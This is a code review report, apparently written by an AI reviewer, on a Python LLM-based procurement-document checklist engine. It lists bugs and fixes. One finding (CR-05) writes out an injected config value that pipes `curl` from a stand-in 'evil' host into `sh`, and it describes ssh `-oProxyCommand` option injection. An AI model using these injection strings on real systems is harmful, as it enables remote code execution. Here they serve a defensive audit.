---
phase: 05-motor-analise-checklist
reviewed: 2026-08-26T00:00:00Z
depth: standard
files_reviewed: 52
files_reviewed_list:
  - sysdoc.py
  - pyproject.toml
  - sysdoc_dvi/__init__.py
  - sysdoc_dvi/agente.py
  - sysdoc_dvi/checklist.py
  - sysdoc_dvi/checkpoint.py
  - sysdoc_dvi/cli.py
  - sysdoc_dvi/config.py
  - sysdoc_dvi/despacho.py
  - sysdoc_dvi/grounding.py
  - sysdoc_dvi/montagem.py
  - sysdoc_dvi/normas.py
  - sysdoc_dvi/pecas.py
  - sysdoc_dvi/pipeline.py
  - sysdoc_dvi/prompts/__init__.py
  - sysdoc_dvi/prompts/extracao_precos.jinja
  - sysdoc_dvi/prompts/item_julgamento.jinja
  - sysdoc_dvi/prompts/item_presenca.jinja
  - sysdoc_dvi/prompts/sintese_documento.jinja
  - sysdoc_dvi/prompts/sintese_executivo.jinja
  - sysdoc_dvi/provedores.py
  - sysdoc_dvi/relatorio.py
  - sysdoc_dvi/sintese.py
  - sysdoc_dvi/tipos.py
  - sysdoc_dvi/verificacoes/__init__.py
  - sysdoc_dvi/verificacoes/calculo.py
  - sysdoc_dvi/verificacoes/mecanica.py
  - checklists/dvi.yaml
  - normas/vigencia.yaml
  - templates/render_analise.py
  - templates/schema_sysdoc.json
  - templates/validate_sysdoc.py
  - tests/fixtures/mcp_sintetico.json
  - tests/test_cli.py
  - tests/test_dvi_calculo.py
  - tests/test_dvi_checklist.py
  - tests/test_dvi_checklist_conteudo.py
  - tests/test_dvi_create.py
  - tests/test_dvi_despacho.py
  - tests/test_dvi_grounding.py
  - tests/test_dvi_mecanica.py
  - tests/test_dvi_montagem.py
  - tests/test_dvi_normas.py
  - tests/test_dvi_pecas.py
  - tests/test_dvi_provedores.py
  - tests/test_dvi_run.py
  - tests/test_dvi_sintese.py
  - tests/test_nomes_artefatos.py
  - tests/test_validate.py
  - skills/sysdoc/SKILL.md
  - .claude/skills/sysdoc-analise/SKILL.md
  - .opencode/skills/sysdoc-analise/SKILL.md
findings:
  critical: 5
  warning: 11
  info: 8
status: issues_found
---

# Phase 5: Code Review Report

**Reviewed:** 2026-08-26
**Depth:** standard
**Files Reviewed:** 52
**Status:** issues_found

**Fix round (2026-08-26):** CR-01, CR-02, CR-03, CR-04, WR-01, WR-02, WR-04 e WR-05 corrigidos (commits `fix(05): ...`; ver a linha **Outcome** em cada achado). CR-05 (injeção no `deploy`) e os demais avisos/infos (WR-03, WR-06..WR-11, IN-01..IN-08) permanecem explicitamente em aberto.

## Summary

Review of the Phase 5 checklist-driven analysis engine (`sysdoc_dvi` package, `sysdoc-dvi` binary, checklist/vigência data, and supporting CLI/tests). The security-sensitive surfaces the phase targeted are largely handled well: API keys never enter `ConfigDvi`, error messages, or the execution report; TLS is never disabled; the cacheable prefix contains only the fixed instruction plus `base_legal_texto` (verified by test); prompt templates carry explicit anti-injection framing; cache-path resolution in `pecas.py` guards against traversal; checkpoints are written atomically; and tests block real network calls.

However, two core verification types are functionally broken (CR-01, CR-02 — both confirmed by live reproduction with the real code and no network), and two systemic contract conflicts between the DVI engine and the immutable validator cause the pipeline to fail on its mainline path exactly when it does its job (CR-03, CR-04). A pre-existing but in-scope command-injection vector in `deploy` remains (CR-05). Several degradation paths that the phase's own RF9 requirement ("one item never sinks the whole analysis") depends on are incomplete.

Notably, the unit tests for `despacho`'s calculo path use a hand-written `AgenteFalso` that fulfills a contract (`para` = JSON string of extracted rows) which the real `AgenteLLM` does not implement — the stubs mask CR-01 entirely. The end-to-end `test_dvi_run.py` also injects a fake agent and a synthetic 3-item checklist, so the real checklist, the calculo type, and the vigência type are never exercised end-to-end.

## Critical Issues

### CR-01: `AgenteLLM` cannot execute `calculo` items — the deterministic price audit is unreachable in production

**Outcome:** fixed — commit 5159286 (`fix(05): CR-01`).

**File:** `sysdoc_dvi/agente.py:105-119` (with `sysdoc_dvi/despacho.py:244-261`)
**Issue:** The despacho contract (documented in `despacho.py`'s own docstring) requires the agent to return the extracted price-table rows serialized as JSON in the `para` field for `tipo="calculo"`. `AgenteLLM.executar_item` never does this: it always reads the response as an item object (`conteudo.get("seção")`, `conteudo.get("de")`, ...). For calculo, the schema sent to the provider is `SCHEMA_TABELA_PRECOS` — a JSON **array** — so `resposta.conteudo` is a `list` and `conteudo.get(...)` raises `AttributeError`. `_executar_calculo` swallows it into a `pendente` result. Reproduced against the real code:

```
classificacao: pendente
falha_estruturada: falha ao chamar o agente para extração de preços: 'list' object has no attribute 'get'
```

Every `calculo` item (e.g., active `DVI-AMB-003`) permanently degrades to `pendente`; `auditar_tabela_precos` (T-05-14, CA2 "zero falso negativo") never runs through the real agent. The despacho tests hide this because `AgenteFalso` (tests/test_dvi_despacho.py:288, 310) implements the contract by hand.
**Fix:** In `AgenteLLM.executar_item`, branch on `item.tipo == "calculo"`:
```python
if item.tipo == "calculo":
    linhas = resposta.conteudo if isinstance(resposta.conteudo, list) else []
    return ResultadoItem(
        checklist_id=item.id, origem_verificacao="llm",
        documento=item.documento_saida, seção="", de="",
        para=json.dumps(linhas, ensure_ascii=False),
        parecer="", fundamento="", classificação="pendente",
        severidade=item.severidade_default, risco_jurídico="informativo",
        uso=resposta.uso,
    )
```
Add an integration test that wires the real `AgenteLLM` (with mocked `chamar_modelo` returning an array) through `despacho.executar_item`.

### CR-02: Vigência check reports `suspensa` and `pendente_de_conferencia` norms as "norma vigente conforme tabela curada"

**Outcome:** fixed — commit 4c11e4f (`fix(05): CR-02`).

**File:** `sysdoc_dvi/normas.py:234-250`
**Issue:** `verificar_item_vigencia` only special-cases `{"revogada", "substituida"}` and "not catalogued". Any catalogued norm whose status is `suspensa` or `pendente_de_conferencia` falls through to the final branch, which emits `classificação="conforme"` with the parecer "refere-se a norma vigente conforme tabela curada" — a fabricated legal assertion. Reproduced:

```
status suspensa -> conforme | ... norma vigente conforme tabela curada.
status pendente_de_conferencia -> conforme | ... norma vigente conforme tabela curada.
```

This is severe in practice: 11 of the 14 entries in `normas/vigencia.yaml` are currently `pendente_de_conferencia`, so the engine will routinely certify unverified norms as vigente — directly violating the project rule "nunca inventar... use `pendente` quando a base é insuficiente" and the module's own D-10..D-13 contract.
**Fix:** Handle each status explicitly before the conforme branch:
```python
if entrada["status"] == "suspensa":
    # classificação="risco", risco_jurídico="relevante", parecer citando a suspensão
if entrada["status"] == "pendente_de_conferencia":
    # classificação="pendente", risco_jurídico="informativo",
    # parecer: "status ainda não conferido pela curadoria humana"
```
Only `status == "vigente"` may produce the "norma vigente" conforme result.

### CR-03: Grounding rejection keeps the hallucinated `de` in the final JSON, so `sysdoc validate` traceability fails and the run exits non-zero (RF9 violation)

**Outcome:** fixed — commit db399b6 (`fix(05): CR-03`).

**File:** `sysdoc_dvi/grounding.py:112-118` (surfaces at `sysdoc_dvi/pipeline.py:313-328`)
**Issue:** `aplicar_grounding` reclassifies a non-anchored item to `pendente` but deliberately preserves the original (unanchorable) `de` "for the execution report". That same `ResultadoItem.de` flows unchanged through `montar_json` into `dados_consolidados.json`. The immutable validator's `validate_traceability` then checks that exact `de` against the extracted text — the very check the grounding gate already concluded it fails — so `sysdoc validate` returns errors and `executar_run` returns non-zero without rendering HTML. Net effect: a single hallucinated quote from the model sinks the entire run, which is precisely what RF9 ("um item nunca derruba a análise inteira") and the `pendente` degradation design are supposed to prevent. The stricter grounding gate makes this a common, not exotic, path.
**Fix:** When grounding rejects, rewrite the JSON-bound `de` to the recognized omission convention (short-circuits both `verificar_trecho` and `validate_sysdoc.is_traceable`), preserving the original excerpt only in the parecer/relatorio:
```python
return replace(
    resultado,
    de=f"[OMISSÃO] trecho citado pelo modelo não localizado na peça",
    classificação="pendente", risco_jurídico="informativo",
    falha_grounding=True, parecer=novo_parecer,
)
```
(`novo_parecer` may keep the rejected excerpt for auditability.)

### CR-04: Items with `peca` ∈ {MCP, RISCOS, PROCESSO} have `de` validated against ETP/TR text — a correctly grounded literal quote fails validation

**Outcome:** fixed — commit 0b6de16 (`fix(05): CR-04`) — resolved by evolving `validate_traceability` to also trace `de` against the union of all cached document texts under `.sysdoc/cache/textos/documentos/` (behavior unchanged when only ETP/TR exist); renderer/template untouched.

**File:** `checklists/dvi.yaml` (active items DVI-AMB-004, DVI-AMB-014, DVI-AMB-028, DVI-AMB-029) with `templates/validate_sysdoc.py:317-374` (immutable) and `sysdoc_dvi/despacho.py` / `sysdoc_dvi/normas.py`
**Issue:** For these items, `de` is (by design and by grounding enforcement) a literal excerpt of the MCP/RISCOS/PROCESSO piece, but `documento_saida` is ETP/TR. The immutable validator's `load_source_texts` only knows `ETP.txt`/`TR.txt` and checks each item's `de` against the text of its `documento`. A quote unique to the Mapa de Riscos (DVI-AMB-029) or the processo piece (DVI-AMB-014) will not be token-window-traceable in ETP/TR, producing `campo 'de' não foi rastreado` errors → `sysdoc validate` fails → run exits 1. The engine and the validator enforce mutually contradictory requirements: the better the grounding against the correct piece, the more likely validation fails. (DVI-AMB-028's vigência `de` is a norm citation that may coincidentally appear in ETP; the failure is data-dependent but systemic.)
**Fix:** Since the validator is immutable, the engine must emit `de` for cross-piece items in a form the validator accepts: prefix with the recognized `[OMISSÃO]`-style marker plus the quote and source piece, e.g. in `montar_json` (or despacho) when `item.peca != item.documento_saida`:
```python
de = f"[OMISSÃO] verificado na peça {resultado.seção}: {resultado.de}"
```
or add a per-item rule at montagem time. Add a regression test asserting that a run containing a RISCOS-sourced grounded item passes `validate_sysdoc.validate`.

### CR-05: Command/argument injection in `deploy` via unvalidated `.sysdoc/config.yaml` (`vps_host`, `vps_path`)

**Outcome:** open — deferred (explicitly out of scope for this fix round).

**File:** `sysdoc.py:859-889`
**Issue:** `vps_path` is interpolated verbatim into a remote shell command executed over SSH (`f"idx=1; while [ -f {vps_path}/index${{idx}}.html ]..."`), and `vps_host` is passed as a raw argv element to `ssh`/`scp`. A project folder's `.sysdoc/config.yaml` is data that can arrive with a third-party bundle of procurement documents; a value like `vps_path: "/tmp; curl http://evil|sh"` executes arbitrary commands on the user's VPS, and a `vps_host` beginning with `-oProxyCommand=...` executes locally via ssh option injection. (Pre-existing before Phase 5, but in-scope and unmitigated.) There is also a hardcoded fallback `root@76.13.170.15:/opt/web/cfc-analise/html` — with an empty config, reports are silently shipped to a hardcoded root@IP (see WR-10).
**Fix:** Validate before use:
```python
if not re.fullmatch(r"[A-Za-z0-9._-]+@[A-Za-z0-9.-]+", vps_host):
    print("vps_host inválido"); return 1
if not re.fullmatch(r"/[A-Za-z0-9._/-]*", vps_path):
    print("vps_path inválido"); return 1
ssh_cmd = ["ssh", "--", vps_host, f"idx=1; while [ -f {shlex.quote(vps_path)}/index${{idx}}.html ]; ..."]
```
and use `scp -- src dest`.

## Warnings

### WR-01: Any `ErroProvedor` (or unexpected exception) during synthesis escapes `executar_run` as a raw traceback

**Outcome:** fixed — commit da14caa (`fix(05): WR-01/WR-02`).

**File:** `sysdoc_dvi/pipeline.py:62-69, 283-292`; `sysdoc_dvi/sintese.py:123-155`
**Issue:** Item execution degrades provider failures to `pendente`, but the synthesis phase does not: `_AdaptadorAgenteSintese.chamar` → `chamar_modelo` raises `ErroProvedor` on any HTTP error, and `ErroProvedor` is not in `_ERROS_CONHECIDOS`. After a long (paid) item-execution phase, one HTTP 429/500 during synthesis crashes `sysdoc-dvi run` with an unhandled traceback instead of a remedied message. A non-dict `resposta.conteudo` in `_chamar_com_retry` (`conteudo.get`) would raise `AttributeError` with the same effect.
**Fix:** Add `ErroProvedor` to `_ERROS_CONHECIDOS` (import from `provedores`), and guard `resposta.conteudo` type in `_chamar_com_retry`. The checkpoint is preserved either way, so a friendly retry message is the correct behavior.

### WR-02: One incoherent LLM item (`classificação=risco` + `risco_jurídico` ∈ {menor, informativo}) aborts the entire montagem — deterministic dead-end

**Outcome:** fixed — commit da14caa (`fix(05): WR-01/WR-02`) — incoherent combinations are degraded deterministically to `pendente` with `falha_estruturada` before montagem.

**File:** `sysdoc_dvi/montagem.py:109-142`
**Issue:** `_montar_item` repairs only the `conforme`+non-informativo combination. `SCHEMA_ITEM` allows the model to emit `risco`+`menor`, which `validate_item_coherence` rejects → `ErroMontagem` → the whole run returns 1 with no relatorio saved (the exception fires before `_gravar_relatorio`). Because the offending result is persisted in the checkpoint and temperature is 0, re-running reproduces the same abort: a permanent dead-end until `--no-resume` (and likely even then). This contradicts RF9.
**Fix:** Repair instead of aborting: coerce `risco`+{menor, informativo} to `risco_jurídico="relevante"` (or degrade the item to `pendente` with an explanatory parecer), and likewise for `bloqueante`+severidade fora de {crítica, alta}.

### WR-03: `ConfigDvi.tolerancia_absoluta` is dead configuration — the price audit always uses hardcoded tolerances

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/despacho.py:259`; `sysdoc_dvi/config.py:53, 147`
**Issue:** `_executar_calculo` calls `auditar_tabela_precos(linhas)` with default tolerances; the `tolerancia_absoluta` value loaded from `~/.sysdoc/config.json` is never threaded through (despacho does not receive the config). Users who configure a tolerance get silently ignored.
**Fix:** Pass the tolerance from `ConfigDvi` through `executar_checklist`/`executar_item` into `_executar_calculo`, e.g. `auditar_tabela_precos(linhas, tolerancia_absoluta=Decimal(config.tolerancia_absoluta))`, or delete the config field.

### WR-04: `modelo_ia` derivation breaks for vendor-prefixed OpenRouter models

**Outcome:** fixed — commit c8c9e26 (`fix(05): WR-04`) — `derivar_modelo_ia` takes the last path segment and sanitizes characters outside the slug domain (e.g. `openrouter/z-ai/glm-5.2:free` → `glm-5.2-free`).

**File:** `sysdoc_dvi/pipeline.py:295`; `sysdoc_dvi/montagem.py:39, 56-68`
**Issue:** `config.forte.partition("/")[2]` keeps everything after the first slash. Real OpenRouter model IDs are vendor-prefixed (`openrouter/deepseek/deepseek-chat` → `deepseek/deepseek-chat`), which fails `_MODELO_IA_PATTERN` (no `/` allowed) → `ErroMontagem` aborts the run at step 7. The docs' example `openrouter/deepseek-chat` is not a valid OpenRouter model ID, so the mainline OpenRouter configuration fails.
**Fix:** Use the last path segment for the slug: `modelo_ia = config.forte.rsplit("/", 1)[-1]`.

### WR-05: Execution report prints a broken next-step command (`sysdoc create dvi <pasta>`)

**Outcome:** fixed — commit b0f7b2e (`fix(05): WR-05`).

**File:** `sysdoc_dvi/relatorio.py:168`; `sysdoc.py:1465-1481`
**Issue:** `sysdoc create` parses two positionals as `[pasta] [tipo]` (epilog: `sysdoc create Combustivel dvi`). The relatorio tells the user to run `sysdoc create dvi <pasta>`, which parses as project="dvi", tipo="<pasta>" and fails with "JSON não encontrado".
**Fix:** `linhas.append(f"Próximo passo: sysdoc create {project_arg} dvi")`.

### WR-06: Synthesis fabricates a ≥120-word parecer and an "aprovado" classification for documents with zero analyzed items

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/sintese.py:82-94, 180-195`
**Issue:** If a filtered checklist yields items for only one document, `sintetizar` still calls the model for the other document with an empty item list and a hard 120-word minimum — an explicit invitation to fabricate — and `classificar_documento` returns `"aprovado"` for a document that was never analyzed. In a legal audit artifact, "TR aprovado" with no verified item is materially misleading.
**Fix:** When `itens_doc` is empty, skip the model call and emit a deterministic parecer ("Nenhum item do checklist se aplica à peça ...") padded to the validator minimum, with `classificação_documento="pendente_de_complementação"`.

### WR-07: Mojibake (double-encoded UTF-8) in `render_context` output and CLI help strings

**Outcome:** open — deferred.

**File:** `sysdoc.py:459, 464, 466, 468, 471, 488, 510, 1409, 1416`
**Issue:** Strings such as `"## Documentos Para AnÃ¡lise"`, `"## ReferÃªncias"`, `"Nenhuma referÃªncia extraÃ­da."`, `"SeÃ§Ãµes numeradas nÃ£o detectadas."`, `"o HTML serÃ¡ gravado"`, and help text `"JSON especÃ­fico"` are corrupted. These land verbatim in every generated `contexto_sysdoc.md` that is fed to LLMs — violating the project's own norma-culta rule and degrading prompts.
**Fix:** Restore the correct accented strings ("Análise", "Referências", "extraída", "Seções ... não detectadas", "será", "específico").

### WR-08: Malformed numeric fields in `~/.sysdoc/config.json` crash with raw `ValueError` instead of `ErroConfiguracaoModelos`

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/config.py:146-150`
**Issue:** `float(secao_dvi.get("limiar_grounding", 0.85))`, `int(secao_dvi.get("timeout_s", 120))` etc. raise uncaught `ValueError`/`TypeError` for values like `"abc"` or `null`-ish types, producing a traceback — breaking the module's own D-16 contract ("remédio na própria mensagem"), which every other path in this file honors.
**Fix:** Wrap the conversions and re-raise as `ErroConfiguracaoModelos` naming the offending field and expected type.

### WR-09: `carregar_checklist` does not validate `severidade_default` (nor the types of `pergunta`/`base_legal_texto`/`referencia`)

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/checklist.py:53-142`
**Issue:** The module contract says "valor fora do domínio ... vira `ErroChecklist` explícito", but `severidade_default` accepts anything (e.g., unaccented `"media"`, or a list). An invalid value silently propagates through paid LLM execution and only fails at the final `sysdoc validate` (enum check) — the most expensive possible failure point.
**Fix:** Validate `severidade_default` against `{"crítica", "alta", "média", "baixa", "informativa"}` and require `pergunta`/`base_legal_texto`/`referencia` to be non-empty strings, at load time.

### WR-10: Hardcoded deploy fallback `root@76.13.170.15:/opt/web/cfc-analise/html`

**Outcome:** open — deferred.

**File:** `sysdoc.py:860-861`
**Issue:** With an empty/absent project config, `deploy` silently ships the generated report to a hardcoded root@IP and path. Beyond embedding infrastructure details in source, it makes an unconfigured `sysdoc deploy` exfiltrate a (potentially sensitive) analysis to whatever host answers at that IP.
**Fix:** Remove the fallback; when `vps_host`/`vps_path` are unset, print the remedy (`sysdoc config --vps ... --path ...`) and return 1.

### WR-11: Structured-output schemas are incompatible with OpenAI/OpenRouter `strict: true` mode

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/sintese.py:48-58`; `sysdoc_dvi/despacho.py:89-124`; `sysdoc_dvi/provedores.py:67-71, 102-106`
**Issue:** Both providers are sent `"strict": true` with the given schema. OpenAI strict mode requires `additionalProperties: false` on every object and rejects non-object roots. `SCHEMA_PARECER_EXECUTIVO`/`SCHEMA_PARECER_DOCUMENTO` lack `additionalProperties: false`, and `SCHEMA_TABELA_PRECOS` has an **array** root — both yield HTTP 400 from OpenAI (and OpenRouter models that honor strict). Result: every synthesis call on OpenAI crashes the run (via WR-01), and every calculo item on OpenAI degrades to `pendente` (compounding CR-01). Tests only assert the payload shape, never schema acceptability.
**Fix:** Add `"additionalProperties": false` to the sintese schemas; for calculo, wrap the array in an object root (`{"type":"object","properties":{"linhas": SCHEMA_TABELA_PRECOS},"required":["linhas"],"additionalProperties":false}`) and unwrap in the agent.

## Info

### IN-01: `Pareceres.nota_integridade` is computed and discarded

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/sintese.py:101-120, 201`; `sysdoc_dvi/montagem.py:225-228`
**Issue:** `_nota_integridade` builds a detailed integrity note (origins, grounding failures), but `montar_json` overwrites `nota_integridade` with its own generic text; the sintese value is never consumed anywhere.
**Fix:** Pass `pareceres.nota_integridade` into `montar_json` (it is more informative), or delete `_nota_integridade`.

### IN-02: Conforme calculo/mecanica items receive "pendente de verificação humana" placeholder text

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/pipeline.py:80-101`; `sysdoc_dvi/despacho.py:282-298`; `sysdoc_dvi/verificacoes/mecanica.py:183-199`
**Issue:** A conforming calculo result has empty `para` and `de="[OMISSÃO]"`; a conforming mecanica result has empty `de`/`para`. `_preencher_pendencias` fills them with "[OMISSÃO] item ... pendente de verificação humana" even though the item is `classificação="conforme"` — the final report shows contradictory text.
**Fix:** Use classification-aware placeholder text (e.g., "[OMISSÃO] verificação determinística sem trecho aplicável; nenhuma divergência encontrada" for conforme items).

### IN-03: `montagem` mutates `sys.path` at import time to import from `templates/`

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/montagem.py:30-35`
**Issue:** Inserting `templates/` at `sys.path[0]` lets any module name in that directory shadow stdlib/third-party imports for the whole process.
**Fix:** Load `validate_sysdoc.py` via `importlib.util.spec_from_file_location` instead.

### IN-04: `despacho` imports the private `_CITACAO_PATTERN` from `normas`

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/despacho.py:41`
**Issue:** Cross-module dependency on an underscore-private regex; renames in `normas` will silently break fundamentação checking.
**Fix:** Export it publicly (e.g., `CITACAO_PATTERN`) or expose an `extrair_citacoes(texto)` helper.

### IN-05: `_registro_serializavel` has an unused `alvo` parameter

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/provedores.py:230`
**Issue:** `alvo` is accepted and ignored; the record derives provider/model from `resposta.uso`.
**Fix:** Drop the parameter.

### IN-06: `sysdoc-dvi` help epilog shows `--forte` as a boolean flag

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/cli.py:43-51, 73-76`
**Issue:** The epilog example `sysdoc-dvi run Processo042 --tipo tic --forte` fails at parse time (`--forte` requires a value). Also, `sysdoc-dvi config --economico/--forte` writes values without the `provedor/modelo` validation that `carregar_config_dvi` applies, deferring the error to run time.
**Fix:** Fix the example (`--forte anthropic/claude-opus-4`) and call `_validar_alvo` before persisting in `config()`.

### IN-07: `hash_checklist` re-reads the file after `carregar_checklist` (TOCTOU)

**Outcome:** open — deferred.

**File:** `sysdoc_dvi/pipeline.py:231-238`; `sysdoc_dvi/checklist.py:155-161`
**Issue:** The checklist is parsed, then separately re-read to hash; if the file changes between the two reads, the checkpoint/relatorio hash does not describe the items actually executed.
**Fix:** Read bytes once, hash them, and parse from the same bytes.

### IN-08: SKILL.md documents the code-level agent as "implementação de referência via cliente Anthropic"

**Outcome:** open — deferred.

**File:** `skills/sysdoc/SKILL.md:58`
**Issue:** The actual implementation is multi-provider over `requests` (OpenRouter/OpenAI/Gemini/Anthropic); the doc understates it and may steer harnesses wrong.
**Fix:** Update the sentence to describe the multi-provider `provedores.py` routing.

---

_Reviewed: 2026-08-26_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
